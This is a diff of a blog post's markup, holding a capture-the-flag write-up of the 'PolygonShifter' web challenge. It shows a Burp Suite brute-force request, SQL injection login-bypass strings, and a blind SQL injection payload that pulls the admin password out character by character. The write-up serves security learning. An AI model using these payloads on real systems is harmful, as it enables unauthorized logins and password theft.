@@ -14,27 +14,25 @@ categories:
 
 Hey folks,
 
-I know in my last blog I promised to do a couple exploit ones instead of doing boring Web stuff. But, this level was really easy and I still wanted to do a writeup, so you're just going to have to wait a little while longer for my 'kappa' writeup!  
-  
+I know in my last blog I promised to do a couple exploit ones instead of doing boring Web stuff. But, this level was really easy and I still wanted to do a writeup, so you're just going to have to wait a little while longer for my 'kappa' writeup!
+<!--more-->
 This 100-point Web challenge, called PolygonShifter, basically added some anti-bot defenses to a Web site by obfuscating the username/password field names, as well as the action for the POST request. When you visited the page, you'd see something like this:
 
-```
-
-<span class="htmlTag"><</span><span class="htmlTagName">form</span><span class="htmlTag"> </span><span class="htmlArg">action</span><span class="htmlTag">=</span><span class="Constant">"/S1tl90gme2GJ67epbZz9"</span><span class="htmlTag"> </span><span class="htmlArg">method</span><span class="htmlTag">=</span><span class="Constant">"POST"</span><span class="htmlTag">></span>
-    <span class="htmlTag"><</span><span class="htmlTagName">label</span><span class="htmlTag"> </span><span class="htmlArg">for</span><span class="htmlTag">=</span><span class="Constant">""</span><span class="htmlTag"> </span><span class="htmlArg">style</span><span class="htmlTag">=</span><span class="Constant">"text-align:left;"</span><span class="htmlTag">></span>Username<span class="htmlEndTag"></</span><span class="htmlTagName">label</span><span class="htmlEndTag">></span>
-    <span class="htmlTag"><</span><span class="htmlTagName">input</span><span class="htmlTag"> </span><span class="htmlArg">type</span><span class="htmlTag">=</span><span class="Constant">"text"</span><span class="htmlTag"> </span><span class="htmlArg">id</span><span class="htmlTag">=</span><span class="Constant">"lK1TFqrcp3fvIRSg8V7T"</span><span class="htmlTag"> </span><span class="htmlArg">name</span><span class="htmlTag">=</span><span class="Constant">"L1UIVbxzFD8wUUo8SaJH"</span><span class="htmlTag">></span>
-    <span class="htmlTag"><</span><span class="htmlTagName">label</span><span class="htmlTag"> </span><span class="htmlArg">for</span><span class="htmlTag">=</span><span class="Constant">"LkW7Ye9ItPb8CGeKZrMU"</span><span class="htmlTag"> </span><span class="htmlArg">style</span><span class="htmlTag">=</span><span class="Constant">"text-align:left;"</span><span class="htmlTag">></span>Password<span class="htmlEndTag"></</span><span class="htmlTagName">label</span><span class="htmlEndTag">></span>
-    <span class="htmlTag"><</span><span class="htmlTagName">input</span><span class="htmlTag"> </span><span class="htmlArg">type</span><span class="htmlTag">=</span><span class="Constant">"password"</span><span class="htmlTag"> </span><span class="htmlArg">id</span><span class="htmlTag">=</span><span class="Constant">"LkW7Ye9ItPb8CGeKZrMU"</span><span class="htmlTag"> </span><span class="htmlArg">name</span><span class="htmlTag">=</span><span class="Constant">"LmmURBa3S5NRYBwzHXhC"</span><span class="htmlTag">></span>
-    <span class="htmlTag"><</span><span class="htmlTagName">input</span><span class="htmlTag"> </span><span class="htmlArg">class</span><span class="htmlTag">=</span><span class="Constant">"primary large"</span><span class="htmlTag"> </span><span class="htmlArg">type</span><span class="htmlTag">=</span><span class="Constant">"submit"</span><span class="htmlTag"> </span><span class="htmlArg">value</span><span class="htmlTag">=</span><span class="Constant">"Login"</span><span class="htmlTag">></span>
-<span class="htmlEndTag"></</span><span class="htmlTagName">form</span><span class="htmlEndTag">></span>
-```
+<pre>
+<span class="htmlTag">&lt;</span><span class="htmlTagName">form</span><span class="htmlTag"> </span><span class="htmlArg">action</span><span class="htmlTag">=</span><span class="Constant">&quot;/S1tl90gme2GJ67epbZz9&quot;</span><span class="htmlTag"> </span><span class="htmlArg">method</span><span class="htmlTag">=</span><span class="Constant">&quot;POST&quot;</span><span class="htmlTag">&gt;</span>
+    <span class="htmlTag">&lt;</span><span class="htmlTagName">label</span><span class="htmlTag"> </span><span class="htmlArg">for</span><span class="htmlTag">=</span><span class="Constant">&quot;&quot;</span><span class="htmlTag"> </span><span class="htmlArg">style</span><span class="htmlTag">=</span><span class="Constant">&quot;text-align:left;&quot;</span><span class="htmlTag">&gt;</span>Username<span class="htmlEndTag">&lt;/</span><span class="htmlTagName">label</span><span class="htmlEndTag">&gt;</span>
+    <span class="htmlTag">&lt;</span><span class="htmlTagName">input</span><span class="htmlTag"> </span><span class="htmlArg">type</span><span class="htmlTag">=</span><span class="Constant">&quot;text&quot;</span><span class="htmlTag"> </span><span class="htmlArg">id</span><span class="htmlTag">=</span><span class="Constant">&quot;lK1TFqrcp3fvIRSg8V7T&quot;</span><span class="htmlTag"> </span><span class="htmlArg">name</span><span class="htmlTag">=</span><span class="Constant">&quot;L1UIVbxzFD8wUUo8SaJH&quot;</span><span class="htmlTag">&gt;</span>
+    <span class="htmlTag">&lt;</span><span class="htmlTagName">label</span><span class="htmlTag"> </span><span class="htmlArg">for</span><span class="htmlTag">=</span><span class="Constant">&quot;LkW7Ye9ItPb8CGeKZrMU&quot;</span><span class="htmlTag"> </span><span class="htmlArg">style</span><span class="htmlTag">=</span><span class="Constant">&quot;text-align:left;&quot;</span><span class="htmlTag">&gt;</span>Password<span class="htmlEndTag">&lt;/</span><span class="htmlTagName">label</span><span class="htmlEndTag">&gt;</span>
+    <span class="htmlTag">&lt;</span><span class="htmlTagName">input</span><span class="htmlTag"> </span><span class="htmlArg">type</span><span class="htmlTag">=</span><span class="Constant">&quot;password&quot;</span><span class="htmlTag"> </span><span class="htmlArg">id</span><span class="htmlTag">=</span><span class="Constant">&quot;LkW7Ye9ItPb8CGeKZrMU&quot;</span><span class="htmlTag"> </span><span class="htmlArg">name</span><span class="htmlTag">=</span><span class="Constant">&quot;LmmURBa3S5NRYBwzHXhC&quot;</span><span class="htmlTag">&gt;</span>
+    <span class="htmlTag">&lt;</span><span class="htmlTagName">input</span><span class="htmlTag"> </span><span class="htmlArg">class</span><span class="htmlTag">=</span><span class="Constant">&quot;primary large&quot;</span><span class="htmlTag"> </span><span class="htmlArg">type</span><span class="htmlTag">=</span><span class="Constant">&quot;submit&quot;</span><span class="htmlTag"> </span><span class="htmlArg">value</span><span class="htmlTag">=</span><span class="Constant">&quot;Login&quot;</span><span class="htmlTag">&gt;</span>
+<span class="htmlEndTag">&lt;/</span><span class="htmlTagName">form</span><span class="htmlEndTag">&gt;</span>
+</pre>
 
 I immediately installed the 'httparty' gem and started writing a solution in ruby, when I had an inspiration. I tried using the same action multiple times, and it worked! It would only work for a few minutes before I had to refresh and get a new one. But, that was enough!
 
-I decided—incorrectly—that this was likely a brute-force level, so I fired up Burp Suite, chose 'Intruder' mode, and set it to something like:
+I decided&mdash;incorrectly&mdash;that this was likely a brute-force level, so I fired up Burp Suite, chose 'Intruder' mode, and set it to something like:
 
-```
-
+<pre>
 <span class="Identifier">POST /im6Kh1pOKr7Y9bbDHiew HTTP/1.0</span>
 <span class="Identifier">Host</span><span class="Normal">:</span><span class="Constant"> 54.204.80.192</span>
 <span class="Identifier">User-Agent</span><span class="Normal">:</span><span class="Constant"> Mozilla/5.0 (X11; Linux x86_64; rv</span><span class="Normal">:</span><span class="Constant">17</span>.0) Gecko/20100101 Firefox/17.0
@@ -48,26 +46,30 @@ I decided—incorrectly—that this was likely a brute-force level, so I fired u
 <span class="Identifier">Content-Type</span><span class="Normal">:</span><span class="Constant"> application/x-www-form-urlencoded</span>
 <span class="Identifier">Content-Length</span><span class="Normal">:</span><span class="Constant"> 56</span>
 
-<span class="Identifier">zDm8T52TDl5ymYfS3Yh5=admin&FcZtaYem0HE0t9bQQCTE=§password§</span>
-```
+<span class="Identifier">zDm8T52TDl5ymYfS3Yh5=admin&amp;FcZtaYem0HE0t9bQQCTE=§password§</span>
+</pre>
 
 Then I used Burp Suite's built-in list of passwords to attack the account.
 
 I let the attack run through the ~1000 or so passwords, then added a filter for 'Hello, ' (in order to find good attempts). There weren't any. Damnit, now I need a new plan!
 
-...then, on a random inspiration, I tried an invert search for 'Wrong password'. And there was one entry: a password containing a single quote returned "An error occurred" instead of "Wrong password". \*facepalm\*, it's sql injection!
+...then, on a random inspiration, I tried an invert search for 'Wrong password'. And there was one entry: a password containing a single quote returned "An error occurred" instead of "Wrong password". *facepalm*, it's sql injection!
 
 So, I tried logging in with:
 
-- Username :: admin
-- Password :: ' or 1=1--
+<ul>
+  <li>Username :: admin</li>
+  <li>Password :: ' or 1=1-- </li>
+</ul>
 
 And immediately, I'm logged in... as 'test'. Derp!
 
 So I changed my credentials to:
 
-- Username :: admin
-- Password :: ' or username='admin'--
+<ul>
+  <li>Username :: admin</li>
+  <li>Password :: ' or username='admin'-- </li>
+</ul>
 
 (Don't forget to put a space after the '--' if you're following along!)
 
@@ -77,8 +79,7 @@ Now, it sounds like I need to recover admin's password. CHALLENGE. ACCEPTED.
 
 I threw together a quick Burp Suite Intruder attack that looked like:
 
-```
-
+<pre>
 <span class="Identifier">POST /im6Kh1pOKr7Y9bbDHiew HTTP/1.0</span>
 <span class="Identifier">Host</span><span class="Normal">:</span><span class="Constant"> 54.204.80.192</span>
 <span class="Identifier">User-Agent</span><span class="Normal">:</span><span class="Constant"> Mozilla/5.0 (X11; Linux x86_64; rv</span><span class="Normal">:</span><span class="Constant">17</span>.0) Gecko/20100101 Firefox/17.0
@@ -92,23 +93,28 @@ I threw together a quick Burp Suite Intruder attack that looked like:
 <span class="Identifier">Content-Type</span><span class="Normal">:</span><span class="Constant"> application/x-www-form-urlencoded</span>
 <span class="Identifier">Content-Length</span><span class="Normal">:</span><span class="Constant"> 53</span>
 
-<span class="Identifier">zDm8T52TDl5ymYfS3Yh5=admin&FcZtaYem0HE0t9bQQCTE=%27+or+%28username%3D%27admin%27+and+binary+substring%28password%2C+§1§%2C+1%29+%3D+%27§a§%27%29--+</span>
-```
+<span class="Identifier">zDm8T52TDl5ymYfS3Yh5=admin&amp;FcZtaYem0HE0t9bQQCTE=%27+or+%28username%3D%27admin%27+and+binary+substring%28password%2C+§1§%2C+1%29+%3D+%27§a§%27%29--+</span>
+</pre>
 
 To clean it up, it's basically:
 
-- Username :: admin
-- Password :: ' or (username='admin' and binary substring(password, $1, 1) = '$2')
+<ul>
+  <li>Username :: admin</li>
+  <li>Password :: ' or (username='admin' and binary substring(password, $1, 1) = '$2')</li>
+</ul>
 
 (Where $1 and $2 are Burp Suite's marked fields)
 
 Then I set Burp Suite to use a 'Cluster Bomb' style of attack, which means that each field has its own set of values that are tried. Then I set the two variables to:
 
-- $1 :: numeric, 1 - 45 (I had to keep expanding this since the password was 30+ characters long!)
-- $2 :: custom set, a-z A-Z 0-9 + symbols
+<ul>
+  <li>$1 :: numeric, 1 - 45 (I had to keep expanding this since the password was 30+ characters long!)</li>
+  <li>$2 :: custom set, a-z A-Z 0-9 + symbols</li>
+</ul>
 
 Then I let it run, filtered for 'Hello', and got the following results:
 
-![](https://blogdata.skullsecurity.org/polygonshifter-solution.png)
+<img src='https://blogdata.skullsecurity.org/polygonshifter-solution.png'>
 
 Boom! Arrange those properly and you have your password. :)
+
